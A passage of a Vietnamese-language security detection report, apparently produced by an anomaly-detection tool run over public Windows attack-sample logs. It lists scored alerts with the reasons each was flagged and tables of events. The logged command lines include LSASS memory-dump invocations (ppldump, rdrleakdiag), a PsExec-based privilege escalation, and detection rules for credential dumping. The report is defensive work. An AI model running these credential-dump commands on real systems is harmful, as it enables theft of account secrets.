| 22:20:11 | Sysmon 1 | consent.exe | 0.67 | privilege-escalation | consent.exe 6964 318 0000021FF2606500 |
| 22:20:21 | Sysmon 1 | consent.exe | 0.66 | privilege-escalation | consent.exe 6964 258 0000021FF266EC20 |
| 22:19:27 | Sysmon 1 | rundll32.exe | 0.55 | execution | rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh |

### A0041 · high · MSEDGEWIN10

- thời gian: 2020-02-10 10:08:24 → 10:08:27 UTC, 3 event, 1 process
- tactic: defense-evasion (3)
- process: ppldump.exe (3); user: IEUser
- file log: Defense Evasion/DE_BYOV_Zam64_CA_Memdump_sysmon_7_10.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 3 event)
  - dump lsass / SAM / NTDS (`f_cred_dump_file`, 1 event) ⚠
  - truy cập process lsass (`b_lsass_target`, 1 event) ⚠
  - mở process với toàn quyền (`b_full_access`, 1 event)
  - đọc bộ nhớ process khác (`b_vm_read`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 10:08:24 | Sysmon 1 | ppldump.exe | 1.00 | defense-evasion | ppldump.exe  -p lsass.exe -o a.png |
| 10:08:24 | Sysmon 10 | ppldump.exe | 0.99 | defense-evasion |  |
| 10:08:27 | Sysmon 5 | ppldump.exe | 0.98 | defense-evasion |  |

### A0042 · high · DESKTOP-PIU87N6

- thời gian: 2020-09-28 12:47:36 → 12:47:36 UTC, 3 event, 1 process
- tactic: credential-access (2); defense-evasion (1)
- process: rdrleakdiag.exe (3); user: wanwan
- file log: Credential Access/sysmon_rdrleakdiag_lsass_dump.json
- **vì sao báo:**
  - truy cập process lsass (`b_lsass_target`, 1 event) ⚠
  - dump lsass / SAM / NTDS (`f_cred_dump_file`, 1 event) ⚠

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 12:47:36 | Sysmon 1 | rdrleakdiag.exe | 1.00 | defense-evasion | rdrleakdiag.exe  /p 668 /o C:\Users\wanwan\Desktop /fullmemdmp /snap |
| 12:47:36 | Sysmon 11 | rdrleakdiag.exe | 1.00 | credential-access |  |
| 12:47:36 | Sysmon 8 | rdrleakdiag.exe | 0.91 | credential-access |  |

### A0043 · high · DC1.insecurebank.local

- thời gian: 2019-05-08 03:00:11 → 03:00:37 UTC, 10 event, 1 process
- tactic: persistence (9); defense-evasion (1)
- process: ; user: Administrator, administrator
- file log: Persistence/persistence_security_dcshadow_4742.json

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 03:00:37 | Security 4662 |  | 1.00 | persistence |  |
| 03:00:37 | Security 4662 |  | 0.99 | persistence |  |
| 03:00:37 | Security 4662 |  | 0.99 | persistence |  |
| 03:00:37 | Security 4662 |  | 0.99 | persistence |  |
| 03:00:37 | Security 4662 |  | 0.99 | persistence |  |

### A0044 · high · MSEDGEWIN10

- thời gian: 2020-12-09 16:52:34 → 16:53:23 UTC, 9 event, 5 process
- tactic: privilege-escalation (8); lateral-movement (1)
- process: psexecprivesc.exe (3), svchost.exe (2), <unknown process> (1), psexesvc.exe (1), system (1), mspaint.exe (1); user: SYSTEM, user02
- file log: Privilege Escalation/sysmon_privesc_psexec_dwell.json
- **vì sao báo:**
  - named pipe RPC nhạy cảm (svcctl, samr, lsarpc...) (`f_rpc_pipe`, 4 event)
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 3 event)
  - thực thi trên máy khác (WMI, WinRM, PsExec, DCOM) (`f_remote_target`, 1 event)
  - process con của dịch vụ thực thi từ xa (wsmprovhost, wmiprvse, DCOM) (`b_child_of_remote`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 16:52:44 | Sysmon 18 | psexecprivesc.exe | 1.00 | privilege-escalation |  |
| 16:52:34 | Sysmon 17 | psexecprivesc.exe | 1.00 | privilege-escalation |  |
| 16:52:34 | Sysmon 1 | psexecprivesc.exe | 1.00 | privilege-escalation | "C:\Users\Public\psexecprivesc.exe" C:\Windows\System32\mspaint.exe |
| 16:52:42 | Sysmon 18 | system | 0.96 | privilege-escalation |  |
| 16:52:41 | Sysmon 1 | psexesvc.exe | 0.94 | privilege-escalation | C:\Windows\PSEXESVC.exe |

### A0045 · high · IEWIN7

- thời gian: 2019-04-27 18:47:00 → 18:55:04 UTC, 7 event, 3 process
- tactic: defense-evasion (5); privilege-escalation (1); execution (1)
- process: keefarce.exe (4), powershell.exe (2), keepass.exe (1); user: IEUser
- file log: Credential Access/CA_keefarce_keepass_credump.json, Credential Access/CA_keepass_KeeThief_Get-KeePassDatabaseKey.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 4 event)
  - nạp module không ký (`b_unsigned_module`, 2 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 18:47:00 | Sysmon 1 | keefarce.exe | 1.00 | privilege-escalation | KeeFarce.exe |
| 18:47:00 | Sysmon 7 | keefarce.exe | 1.00 | defense-evasion |  |
| 18:55:04 | Sysmon 8 | powershell.exe | 1.00 | execution |  |
| 18:47:00 | Sysmon 8 | keefarce.exe | 0.99 | defense-evasion |  |
| 18:47:00 | Sysmon 5 | keefarce.exe | 0.98 | defense-evasion |  |

### A0046 · high · PC01.example.corp

- thời gian: 2019-03-18 11:06:25 → 11:27:23 UTC, 9 event, 6 process
- tactic: privilege-escalation (4); defense-evasion (3); persistence (2)
- process: wmic.exe (3), svchost.exe (1), cmd.exe (1), conhost.exe (1), dllhost.exe (1); user: PC01$, user01
- file log: Lateral Movement/LM_4624_mimikatz_sekurlsa_pth_source_machine.json, Lateral Movement/LM_WMIC_4648_rpcss.json

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 11:27:05 | Security 4688 | wmic.exe | 1.00 | defense-evasion |  |
| 11:06:29 | Security 4688 | cmd.exe | 1.00 | privilege-escalation |  |
| 11:06:29 | Security 4624 | svchost.exe | 1.00 | privilege-escalation |  |
| 11:27:23 | Security 4648 | wmic.exe | 0.99 | persistence |  |
| 11:27:23 | Security 4648 | wmic.exe | 0.99 | persistence |  |

### A0047 · high · IEWIN7

- thời gian: 2019-05-02 14:48:51 → 14:49:37 UTC, 2 event, 1 process
- tactic: execution (1); credential-access (1)
- process: powershell.exe (2); user: IEUser
- file log: Credential Access/sysmon_3_10_Invoke-Mimikatz_hosted_Github.json
- **vì sao báo:**
  - kết nối ra IP public (`b_public_dst`, 1 event)
  - truy cập process lsass (`b_lsass_target`, 1 event) ⚠
  - đọc bộ nhớ process khác (`b_vm_read`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 14:49:37 | Sysmon 10 | powershell.exe | 1.00 | credential-access |  |
| 14:48:51 | Sysmon 3 | powershell.exe | 0.92 | execution |  |

### A0048 · high · MSEDGEWIN10

- thời gian: 2020-03-21 05:00:16 → 05:00:45 UTC, 59 event, 24 process
- tactic: defense-evasion (57); persistence (1); privilege-escalation (1)
- process: rundll32.exe (37), svchost.exe (18), usoclient.exe (1), nc.exe (1), cmd.exe (1), whoami.exe (1); user: IEUser, SYSTEM
- file log: Defense Evasion/Sysmon 7  Update Session Orchestrator Dll Hijack.json
- **vì sao báo:**
  - nạp module không ký (`b_unsigned_module`, 36 event)
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 1 event)
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 05:00:17 | Sysmon 7 | rundll32.exe | 1.00 | defense-evasion |  |
| 05:00:17 | Sysmon 7 | rundll32.exe | 1.00 | defense-evasion |  |
| 05:00:17 | Sysmon 7 | rundll32.exe | 1.00 | defense-evasion |  |
| 05:00:17 | Sysmon 7 | rundll32.exe | 1.00 | defense-evasion |  |
| 05:00:17 | Sysmon 7 | rundll32.exe | 1.00 | defense-evasion |  |

### A0049 · high · MSEDGEWIN10

- thời gian: 2020-08-12 13:04:27 → 13:06:08 UTC, 33 event, 12 process
- tactic: privilege-escalation (31); persistence (1); execution (1)
- process: spoolsv.exe (22), cmd.exe (8), powershell.exe (1), wermgr.exe (1), whoami.exe (1); user: IEUser, SYSTEM
- file log: Privilege Escalation/privesc_spoolsv_spl_file_write_sysmon11.json
- **vì sao báo:**
  - ghi file thực thi / script (`f_drop_exec`, 7 event)
  - nạp module không ký (`b_unsigned_module`, 1 event)
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 13:04:28 | Sysmon 11 | powershell.exe | 1.00 | privilege-escalation |  |
| 13:04:27 | Sysmon 11 | spoolsv.exe | 1.00 | privilege-escalation |  |
| 13:06:03 | Sysmon 1 | cmd.exe | 1.00 | privilege-escalation | C:\Windows\system32\cmd.exe /c schtasks /run /TN "Microsoft\Windows\Windows Error Reporting\QueueRep |
| 13:05:36 | Sysmon 1 | cmd.exe | 1.00 | execution | "C:\Windows\system32\cmd.exe"  |
| 13:06:08 | Sysmon 1 | whoami.exe | 0.99 | privilege-escalation | whoami |

### A0050 · high · MSEDGEWIN10

- thời gian: 2021-04-20 20:32:55 → 20:34:11 UTC, 8 event, 6 process
- tactic: lateral-movement (3); privilege-escalation (3); discovery (1); execution (1)
- process: powershell.exe (2), <unknown process> (2), - (1), system (1), cmd.exe (1); user: IEUser, user03
- file log: Lateral Movement/ImpersonateUser-via local Pass The Hash Sysmon and Security.json
- **vì sao báo:**
  - PowerShell chạy ẩn / bỏ qua execution policy (`f_hidden_ps`, 2 event)
  - truy cập share quản trị (ADMIN$, C$, IPC$) (`f_admin_share`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 20:33:59 | Sysmon 3 | powershell.exe | 1.00 | privilege-escalation |  |
| 20:32:55 | Sysmon 1 | powershell.exe | 1.00 | lateral-movement | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 5.1 -s -NoLogo -NoProfile |
| 20:33:00 | Sysmon 18 | system | 0.99 | discovery |  |
| 20:33:00 | Sysmon 1 | cmd.exe | 0.99 | lateral-movement | C:\Windows\System32\cmd.exe |
| 20:33:00 | Security 5145 |  | 0.98 | lateral-movement |  |

_Còn 276 cảnh báo, xem alerts.csv._
